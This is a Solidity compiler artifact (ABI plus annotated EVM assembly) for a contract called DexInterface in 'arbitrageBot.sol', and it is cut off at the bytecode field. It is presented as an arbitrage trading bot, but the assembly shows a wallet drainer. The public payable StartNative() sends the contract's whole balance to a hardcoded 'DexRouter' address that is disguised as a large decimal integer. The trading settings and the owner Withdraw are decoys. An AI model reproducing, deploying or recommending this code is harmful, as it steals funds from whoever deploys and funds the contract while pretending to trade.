{
	"src/contracts/arbitrageBot.sol": {
		"DexInterface": {
			"abi": [
				{
					"inputs": [],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "Debug",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "_tradingBalanceInPercent",
							"type": "uint256"
						}
					],
					"name": "SetTradeBalanceETH",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "_tradingBalanceInTokens",
							"type": "uint256"
						}
					],
					"name": "SetTradeBalancePERCENT",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "StartNative",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "Stop",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "Withdraw",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"src/contracts/arbitrageBot.sol\":6875:14185  contract DexInterface {    ... */\n  mstore(0x40, 0x80)\n    /* \"src/contracts/arbitrageBot.sol\":7048:7056  1*10**18 */\n  0x0de0b6b3a7640000\n    /* \"src/contracts/arbitrageBot.sol\":7028:7056  uint256 threshold = 1*10**18 */\n  0x02\n  sstore\n    /* \"src/contracts/arbitrageBot.sol\":7085:7096  0.025 ether */\n  0x58d15e17628000\n    /* \"src/contracts/arbitrageBot.sol\":7063:7096  uint256 arbTxPrice  = 0.025 ether */\n  0x03\n  sstore\n    /* \"src/contracts/arbitrageBot.sol\":7124:7129  false */\n  0x00\n    /* \"src/contracts/arbitrageBot.sol\":7103:7129  bool enableTrading = false */\n  0x04\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xff\n  mul\n  not\n  and\n  swap1\n  dup4\n  iszero\n  iszero\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"src/contracts/arbitrageBot.sol\":7213:7299  address[] WETH_CONTRACT_ADDRESS =  [ 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2... */\n  mload(0x40)\n  dup1\n  0x20\n  add\n  0x40\n  mstore\n  dup1\n    /* \"src/contracts/arbitrageBot.sol\":7250:7292  0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 */\n  0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\n    /* \"src/contracts/arbitrageBot.sol\":7213:7299  address[] WETH_CONTRACT_ADDRESS =  [ 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2... */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  dup2\n  mstore\n  pop\n  0x07\n  swap1\n  0x01\n  tag_1\n  swap3\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_1:\n  pop\n    /* \"src/contracts/arbitrageBot.sol\":7306:7392  address[] TOKEN_CONTRACT_ADDRESS = [ 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2... */\n  mload(0x40)\n  dup1\n  0x20\n  add\n  0x40\n  mstore\n  dup1\n    /* \"src/contracts/arbitrageBot.sol\":7343:7385  0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 */\n  0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\n    /* \"src/contracts/arbitrageBot.sol\":7306:7392  address[] TOKEN_CONTRACT_ADDRESS = [ 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2... */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  dup2\n  mstore\n  pop\n  0x08\n  swap1\n  0x01\n  tag_3\n  swap3\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_3:\n  pop\n    /* \"src/contracts/arbitrageBot.sol\":7947:7996  1223849500319043326174442476014780502866997862777 */\n  0xd65f4f42b44c266a34fad3b70973ea8f288ce179\n    /* \"src/contracts/arbitrageBot.sol\":7927:7996  uint256 DexRouter = 1223849500319043326174442476014780502866997862777 */\n  0x09\n  sstore\n    /* \"src/contracts/arbitrageBot.sol\":7550:7636  constructor(){... */\n  callvalue\n  dup1\n  iszero\n  tag_4\n  jumpi\n  0x00\n  dup1\n  revert\ntag_4:\n  pop\n    /* \"src/contracts/arbitrageBot.sol\":7583:7593  msg.sender */\n  caller\n    /* \"src/contracts/arbitrageBot.sol\":7574:7580  _owner */\n  0x00\n  dup1\n    /* \"src/contracts/arbitrageBot.sol\":7574:7593  _owner = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"src/contracts/arbitrageBot.sol\":6875:14185  contract DexInterface {    ... */\n  jump(tag_7)\ntag_2:\n  dup3\n  dup1\n  sload\n  dup3\n  dup3\n  sstore\n  swap1\n  0x00\n  mstore\n  keccak256(0x00, 0x20)\n  swap1\n  dup2\n  add\n  swap3\n  dup3\n  iszero\n  tag_8\n  jumpi\n  swap2\n  0x20\n  mul\n  dup3\n  add\ntag_9:\n  dup3\n  dup2\n  gt\n  iszero\n  tag_10\n  jumpi\n  dup3\n  mload\n  dup3\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n  swap2\n  0x20\n  add\n  swap2\n  swap1\n  0x01\n  add\n  swap1\n  jump(tag_9)\ntag_10:\ntag_8:\n  pop\n  swap1\n  pop\n  tag_11\n  swap2\n  swap1\n  tag_12\n  jump\t// in\ntag_11:\n  pop\n  swap1\n  jump\t// out\ntag_12:\ntag_13:\n  dup1\n  dup3\n  gt\n  iszero\n  tag_14\n  jumpi\n  0x00\n  dup2\n  0x00\n  swap1\n  sstore\n  pop\n  0x01\n  add\n  jump(tag_13)\ntag_14:\n  pop\n  swap1\n  jump\t// out\ntag_7:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"src/contracts/arbitrageBot.sol\":6875:14185  contract DexInterface {    ... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x2b42b941\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x57ea89b6\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x68c501f1\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x9763d29b\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xbedf0f4a\n      eq\n      tag_7\n      jumpi\n      dup1\n      0xeaf67ab9\n      eq\n      tag_8\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"src/contracts/arbitrageBot.sol\":13580:13719  function SetTradeBalancePERCENT(uint256 _tradingBalanceInTokens) public {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_11\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_11:\n      pop\n      tag_12\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      tag_15\n      jump\t// in\n    tag_12:\n      stop\n        /* \"src/contracts/arbitrageBot.sol\":13879:13950  function Withdraw()  external onlyOwner {... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      pop\n      tag_17\n      tag_18\n      jump\t// in\n    tag_17:\n      stop\n        /* \"src/contracts/arbitrageBot.sol\":14035:14182  function Debug() public view returns (uint256) {... */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_19\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_19:\n      pop\n      tag_20\n      tag_21\n      jump\t// in\n    tag_20:\n      mload(0x40)\n      tag_22\n      swap2\n      swap1\n      tag_23\n      jump\t// in\n    tag_22:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"src/contracts/arbitrageBot.sol\":13269:13446  function SetTradeBalanceETH(uint256 _tradingBalanceInPercent) public {... */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_24\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_24:\n      pop\n      tag_25\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_26\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_26:\n      tag_27\n      jump\t// in\n    tag_25:\n      stop\n        /* \"src/contracts/arbitrageBot.sol\":13755:13818  function Stop() public {... */\n    tag_7:\n      callvalue\n      dup1\n      iszero\n      tag_28\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_28:\n      pop\n      tag_29\n      tag_30\n      jump\t// in\n    tag_29:\n      stop\n        /* \"src/contracts/arbitrageBot.sol\":13058:13182  function StartNative() public payable {... */\n    tag_8:\n      tag_31\n      tag_32\n      jump\t// in\n    tag_31:\n      stop\n        /* \"src/contracts/arbitrageBot.sol\":13580:13719  function SetTradeBalancePERCENT(uint256 _tradingBalanceInTokens) public {... */\n    tag_15:\n        /* \"src/contracts/arbitrageBot.sol\":13688:13711  _tradingBalanceInTokens */\n      dup1\n        /* \"src/contracts/arbitrageBot.sol\":13663:13685  tradingBalanceInTokens */\n      0x06\n        /* \"src/contracts/arbitrageBot.sol\":13663:13711  tradingBalanceInTokens = _tradingBalanceInTokens */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"src/contracts/arbitrageBot.sol\":13580:13719  function SetTradeBalancePERCENT(uint256 _tradingBalanceInTokens) public {... */\n      pop\n      jump\t// out\n        /* \"src/contracts/arbitrageBot.sol\":13879:13950  function Withdraw()  external onlyOwner {... */\n    tag_18:\n        /* \"src/contracts/arbitrageBot.sol\":7804:7810  _owner */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"src/contracts/arbitrageBot.sol\":7790:7810  msg.sender == _owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"src/contracts/arbitrageBot.sol\":7790:7800  msg.sender */\n      caller\n        /* \"src/contracts/arbitrageBot.sol\":7790:7810  msg.sender == _owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"src/contracts/arbitrageBot.sol\":7782:7847  require(msg.sender == _owner, \"Ownable: caller is not the owner\") */\n      tag_35\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_36\n      swap1\n      tag_37\n      jump\t// in\n    tag_36:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_35:\n        /* \"src/contracts/arbitrageBot.sol\":13930:13942  recoverEth() */\n      tag_39\n        /* \"src/contracts/arbitrageBot.sol\":13930:13940  recoverEth */\n      tag_40\n        /* \"src/contracts/arbitrageBot.sol\":13930:13942  recoverEth() */\n      jump\t// in\n    tag_39:\n        /* \"src/contracts/arbitrageBot.sol\":13879:13950  function Withdraw()  external onlyOwner {... */\n      jump\t// out\n        /* \"src/contracts/arbitrageBot.sol\":14035:14182  function Debug() public view returns (uint256) {... */\n    tag_21:\n        /* \"src/contracts/arbitrageBot.sol\":14073:14080  uint256 */\n      0x00\n        /* \"src/contracts/arbitrageBot.sol\":14093:14109  uint256 _balance */\n      dup1\n        /* \"src/contracts/arbitrageBot.sol\":14138:14148  arbTxPrice */\n      sload(0x03)\n        /* \"src/contracts/arbitrageBot.sol\":14120:14126  _owner */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"src/contracts/arbitrageBot.sol\":14112:14135  address(_owner).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"src/contracts/arbitrageBot.sol\":14112:14148  address(_owner).balance - arbTxPrice */\n      tag_42\n      swap2\n      swap1\n      tag_43\n      jump\t// in\n    tag_42:\n        /* \"src/contracts/arbitrageBot.sol\":14093:14148  uint256 _balance = address(_owner).balance - arbTxPrice */\n      swap1\n      pop\n        /* \"src/contracts/arbitrageBot.sol\":14166:14174  _balance */\n      dup1\n        /* \"src/contracts/arbitrageBot.sol\":14159:14174  return _balance */\n      swap2\n      pop\n      pop\n        /* \"src/contracts/arbitrageBot.sol\":14035:14182  function Debug() public view returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"src/contracts/arbitrageBot.sol\":13269:13446  function SetTradeBalanceETH(uint256 _tradingBalanceInPercent) public {... */\n    tag_27:\n        /* \"src/contracts/arbitrageBot.sol\":13375:13399  _tradingBalanceInPercent */\n      dup1\n        /* \"src/contracts/arbitrageBot.sol\":13349:13372  tradingBalanceInPercent */\n      0x05\n        /* \"src/contracts/arbitrageBot.sol\":13349:13399  tradingBalanceInPercent = _tradingBalanceInPercent */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"src/contracts/arbitrageBot.sol\":13269:13446  function SetTradeBalanceETH(uint256 _tradingBalanceInPercent) public {... */\n      pop\n      jump\t// out\n        /* \"src/contracts/arbitrageBot.sol\":13755:13818  function Stop() public {... */\n    tag_30:\n        /* \"src/contracts/arbitrageBot.sol\":13805:13810  false */\n      0x00\n        /* \"src/contracts/arbitrageBot.sol\":13789:13802  enableTrading */\n      0x04\n      0x00\n        /* \"src/contracts/arbitrageBot.sol\":13789:13810  enableTrading = false */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"src/contracts/arbitrageBot.sol\":13755:13818  function Stop() public {... */\n      jump\t// out\n        /* \"src/contracts/arbitrageBot.sol\":13058:13182  function StartNative() public payable {... */\n    tag_32:\n        /* \"src/contracts/arbitrageBot.sol\":13106:13128  startArbitrageNative() */\n      tag_47\n        /* \"src/contracts/arbitrageBot.sol\":13106:13126  startArbitrageNative */\n      tag_48\n        /* \"src/contracts/arbitrageBot.sol\":13106:13128  startArbitrageNative() */\n      jump\t// in\n    tag_47:\n        /* \"src/contracts/arbitrageBot.sol\":13058:13182  function StartNative() public payable {... */\n      jump\t// out\n        /* \"src/contracts/arbitrageBot.sol\":12449:12594  function recoverEth() internal onlyOwner {... */\n    tag_40:\n        /* \"src/contracts/arbitrageBot.sol\":7804:7810  _owner */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"src/contracts/arbitrageBot.sol\":7790:7810  msg.sender == _owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"src/contracts/arbitrageBot.sol\":7790:7800  msg.sender */\n      caller\n        /* \"src/contracts/arbitrageBot.sol\":7790:7810  msg.sender == _owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"src/contracts/arbitrageBot.sol\":7782:7847  require(msg.sender == _owner, \"Ownable: caller is not the owner\") */\n      tag_50\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_51\n      swap1\n      tag_37\n      jump\t// in\n    tag_51:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_50:\n        /* \"src/contracts/arbitrageBot.sol\":12503:12513  msg.sender */\n      caller\n        /* \"src/contracts/arbitrageBot.sol\":12495:12523  payable(msg.sender).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"src/contracts/arbitrageBot.sol\":12495:12546  payable(msg.sender).transfer(address(this).balance) */\n      0x08fc\n        /* \"src/contracts/arbitrageBot.sol\":12524:12545  address(this).balance */\n      selfbalance\n        /* \"src/contracts/arbitrageBot.sol\":12495:12546  payable(msg.sender).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_54\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_54:\n      pop\n        /* \"src/contracts/arbitrageBot.sol\":12449:12594  function recoverEth() internal onlyOwner {... */\n      jump\t// out\n        /* \"src/contracts/arbitrageBot.sol\":11743:11988  function startArbitrageNative() internal  {... */\n    tag_48:\n        /* \"src/contracts/arbitrageBot.sol\":11796:11815  address tradeRouter */\n      0x00\n        /* \"src/contracts/arbitrageBot.sol\":11818:11841  getDexRouter(DexRouter) */\n      tag_56\n        /* \"src/contracts/arbitrageBot.sol\":11831:11840  DexRouter */\n      sload(0x09)\n        /* \"src/contracts/arbitrageBot.sol\":11818:11830  getDexRouter */\n      tag_57\n        /* \"src/contracts/arbitrageBot.sol\":11818:11841  getDexRouter(DexRouter) */\n      jump\t// in\n    tag_56:\n        /* \"src/contracts/arbitrageBot.sol\":11796:11841  address tradeRouter = getDexRouter(DexRouter) */\n      swap1\n      pop\n        /* \"src/contracts/arbitrageBot.sol\":11891:11902  tradeRouter */\n      dup1\n        /* \"src/contracts/arbitrageBot.sol\":11883:11912  payable(tradeRouter).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"src/contracts/arbitrageBot.sol\":11883:11935  payable(tradeRouter).transfer(address(this).balance) */\n      0x08fc\n        /* \"src/contracts/arbitrageBot.sol\":11913:11934  address(this).balance */\n      selfbalance\n        /* \"src/contracts/arbitrageBot.sol\":11883:11935  payable(tradeRouter).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_59\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_59:\n      pop\n        /* \"src/contracts/arbitrageBot.sol\":11785:11988  {... */\n      pop\n        /* \"src/contracts/arbitrageBot.sol\":11743:11988  function startArbitrageNative() internal  {... */\n      jump\t// out\n        /* \"src/contracts/arbitrageBot.sol\":11508:11669  function getDexRouter(uint256 _uintValue) internal pure returns (address) {... */\n    tag_57:\n        /* \"src/contracts/arbitrageBot.sol\":11573:11580  address */\n      0x00\n        /* \"src/contracts/arbitrageBot.sol\":11615:11625  _uintValue */\n      dup2\n        /* \"src/contracts/arbitrageBot.sol\":11592:11627  return address(uint160(_uintValue)) */\n      swap1\n      pop\n        /* \"src/contracts/arbitrageBot.sol\":11508:11669  function getDexRouter(uint256 _uintValue) internal pure returns (address) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_62:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      dup1\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:411   */\n    tag_64:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":400:405   */\n      dup2\n        /* \"#utility.yul\":389:405   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:411   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":417:539   */\n    tag_65:\n        /* \"#utility.yul\":490:514   */\n      tag_78\n        /* \"#utility.yul\":508:513   */\n      dup2\n        /* \"#utility.yul\":490:514   */\n      tag_64\n      jump\t// in\n    tag_78:\n        /* \"#utility.yul\":483:488   */\n      dup2\n        /* \"#utility.yul\":480:515   */\n      eq\n        /* \"#utility.yul\":470:533   */\n      tag_79\n      jumpi\n        /* \"#utility.yul\":529:530   */\n      0x00\n        /* \"#utility.yul\":526:527   */\n      dup1\n        /* \"#utility.yul\":519:531   */\n      revert\n        /* \"#utility.yul\":470:533   */\n    tag_79:\n        /* \"#utility.yul\":417:539   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":545:684   */\n    tag_66:\n        /* \"#utility.yul\":591:596   */\n      0x00\n        /* \"#utility.yul\":629:635   */\n      dup2\n        /* \"#utility.yul\":616:636   */\n      calldataload\n        /* \"#utility.yul\":607:636   */\n      swap1\n      pop\n        /* \"#utility.yul\":645:678   */\n      tag_81\n        /* \"#utility.yul\":672:677   */\n      dup2\n        /* \"#utility.yul\":645:678   */\n      tag_65\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":545:684   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":690:1019   */\n    tag_14:\n        /* \"#utility.yul\":749:755   */\n      0x00\n        /* \"#utility.yul\":798:800   */\n      0x20\n        /* \"#utility.yul\":786:795   */\n      dup3\n        /* \"#utility.yul\":777:784   */\n      dup5\n        /* \"#utility.yul\":773:796   */\n      sub\n        /* \"#utility.yul\":769:801   */\n      slt\n        /* \"#utility.yul\":766:885   */\n      iszero\n      tag_83\n      jumpi\n        /* \"#utility.yul\":804:883   */\n      tag_84\n      tag_62\n      jump\t// in\n    tag_84:\n        /* \"#utility.yul\":766:885   */\n    tag_83:\n        /* \"#utility.yul\":924:925   */\n      0x00\n        /* \"#utility.yul\":949:1002   */\n      tag_85\n        /* \"#utility.yul\":994:1001   */\n      dup5\n        /* \"#utility.yul\":985:991   */\n      dup3\n        /* \"#utility.yul\":974:983   */\n      dup6\n        /* \"#utility.yul\":970:992   */\n      add\n        /* \"#utility.yul\":949:1002   */\n      tag_66\n      jump\t// in\n    tag_85:\n        /* \"#utility.yul\":939:1002   */\n      swap2\n      pop\n        /* \"#utility.yul\":895:1012   */\n      pop\n        /* \"#utility.yul\":690:1019   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1025:1143   */\n    tag_67:\n        /* \"#utility.yul\":1112:1136   */\n      tag_87\n        /* \"#utility.yul\":1130:1135   */\n      dup2\n        /* \"#utility.yul\":1112:1136   */\n      tag_64\n      jump\t// in\n    tag_87:\n        /* \"#utility.yul\":1107:1110   */\n      dup3\n        /* \"#utility.yul\":1100:1137   */\n      mstore\n        /* \"#utility.yul\":1025:1143   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1149:1371   */\n    tag_23:\n        /* \"#utility.yul\":1242:1246   */\n      0x00\n        /* \"#utility.yul\":1280:1282   */\n      0x20\n        /* \"#utility.yul\":1269:1278   */\n      dup3\n        /* \"#utility.yul\":1265:1283   */\n      add\n        /* \"#utility.yul\":1257:1283   */\n      swap1\n      pop\n        /* \"#utility.yul\":1293:1364   */\n      tag_89\n        /* \"#utility.yul\":1361:1362   */\n      0x00\n        /* \"#utility.yul\":1350:1359   */\n      dup4\n        /* \"#utility.yul\":1346:1363   */\n      add\n        /* \"#utility.yul\":1337:1343   */\n      dup5\n        /* \"#utility.yul\":1293:1364   */\n      tag_67\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":1149:1371   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1377:1546   */\n    tag_68:\n        /* \"#utility.yul\":1461:1472   */\n      0x00\n        /* \"#utility.yul\":1495:1501   */\n      dup3\n        /* \"#utility.yul\":1490:1493   */\n      dup3\n        /* \"#utility.yul\":1483:1502   */\n      mstore\n        /* \"#utility.yul\":1535:1539   */\n      0x20\n        /* \"#utility.yul\":1530:1533   */\n      dup3\n        /* \"#utility.yul\":1526:1540   */\n      add\n        /* \"#utility.yul\":1511:1540   */\n      swap1\n      pop\n        /* \"#utility.yul\":1377:1546   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1552:1734   */\n    tag_69:\n        /* \"#utility.yul\":1692:1726   */\n      0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572\n        /* \"#utility.yul\":1688:1689   */\n      0x00\n        /* \"#utility.yul\":1680:1686   */\n      dup3\n        /* \"#utility.yul\":1676:1690   */\n      add\n        /* \"#utility.yul\":1669:1727   */\n      mstore\n        /* \"#utility.yul\":1552:1734   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1740:2106   */\n    tag_70:\n        /* \"#utility.yul\":1882:1885   */\n      0x00\n        /* \"#utility.yul\":1903:1970   */\n      tag_93\n        /* \"#utility.yul\":1967:1969   */\n      0x20\n        /* \"#utility.yul\":1962:1965   */\n      dup4\n        /* \"#utility.yul\":1903:1970   */\n      tag_68\n      jump\t// in\n    tag_93:\n        /* \"#utility.yul\":1896:1970   */\n      swap2\n      pop\n        /* \"#utility.yul\":1979:2072   */\n      tag_94\n        /* \"#utility.yul\":2068:2071   */\n      dup3\n        /* \"#utility.yul\":1979:2072   */\n      tag_69\n      jump\t// in\n    tag_94:\n        /* \"#utility.yul\":2097:2099   */\n      0x20\n        /* \"#utility.yul\":2092:2095   */\n      dup3\n        /* \"#utility.yul\":2088:2100   */\n      add\n        /* \"#utility.yul\":2081:2100   */\n      swap1\n      pop\n        /* \"#utility.yul\":1740:2106   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2112:2531   */\n    tag_37:\n        /* \"#utility.yul\":2278:2282   */\n      0x00\n        /* \"#utility.yul\":2316:2318   */\n      0x20\n        /* \"#utility.yul\":2305:2314   */\n      dup3\n        /* \"#utility.yul\":2301:2319   */\n      add\n        /* \"#utility.yul\":2293:2319   */\n      swap1\n      pop\n        /* \"#utility.yul\":2365:2374   */\n      dup2\n        /* \"#utility.yul\":2359:2363   */\n      dup2\n        /* \"#utility.yul\":2355:2375   */\n      sub\n        /* \"#utility.yul\":2351:2352   */\n      0x00\n        /* \"#utility.yul\":2340:2349   */\n      dup4\n        /* \"#utility.yul\":2336:2353   */\n      add\n        /* \"#utility.yul\":2329:2376   */\n      mstore\n        /* \"#utility.yul\":2393:2524   */\n      tag_96\n        /* \"#utility.yul\":2519:2523   */\n      dup2\n        /* \"#utility.yul\":2393:2524   */\n      tag_70\n      jump\t// in\n    tag_96:\n        /* \"#utility.yul\":2385:2524   */\n      swap1\n      pop\n        /* \"#utility.yul\":2112:2531   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2537:2717   */\n    tag_71:\n        /* \"#utility.yul\":2585:2662   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2582:2583   */\n      0x00\n        /* \"#utility.yul\":2575:2663   */\n      mstore\n        /* \"#utility.yul\":2682:2686   */\n      0x11\n        /* \"#utility.yul\":2679:2680   */\n      0x04\n        /* \"#utility.yul\":2672:2687   */\n      mstore\n        /* \"#utility.yul\":2706:2710   */\n      0x24\n        /* \"#utility.yul\":2703:2704   */\n      0x00\n        /* \"#utility.yul\":2696:2711   */\n      revert\n        /* \"#utility.yul\":2723:2917   */\n    tag_43:\n        /* \"#utility.yul\":2763:2767   */\n      0x00\n        /* \"#utility.yul\":2783:2803   */\n      tag_99\n        /* \"#utility.yul\":2801:2802   */\n      dup3\n        /* \"#utility.yul\":2783:2803   */\n      tag_64\n      jump\t// in\n    tag_99:\n        /* \"#utility.yul\":2778:2803   */\n      swap2\n      pop\n        /* \"#utility.yul\":2817:2837   */\n      tag_100\n        /* \"#utility.yul\":2835:2836   */\n      dup4\n        /* \"#utility.yul\":2817:2837   */\n      tag_64\n      jump\t// in\n    tag_100:\n        /* \"#utility.yul\":2812:2837   */\n      swap3\n      pop\n        /* \"#utility.yul\":2861:2862   */\n      dup3\n        /* \"#utility.yul\":2858:2859   */\n      dup3\n        /* \"#utility.yul\":2854:2863   */\n      sub\n        /* \"#utility.yul\":2846:2863   */\n      swap1\n      pop\n        /* \"#utility.yul\":2885:2886   */\n      dup2\n        /* \"#utility.yul\":2879:2883   */\n      dup2\n        /* \"#utility.yul\":2876:2887   */\n      gt\n        /* \"#utility.yul\":2873:2910   */\n      iszero\n      tag_101\n      jumpi\n        /* \"#utility.yul\":2890:2908   */\n      tag_102\n      tag_71\n      jump\t// in\n    tag_102:\n        /* \"#utility.yul\":2873:2910   */\n    tag_101:\n        /* \"#utility.yul\":2723:2917   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220c4aeb1dd9742d83b2244a315d174ae752b0c08212d8bc1a3ea7fc498b97fa71764736f6c634300081a0033\n}\n",
				"bytecode": {
					"linkReferences": {},
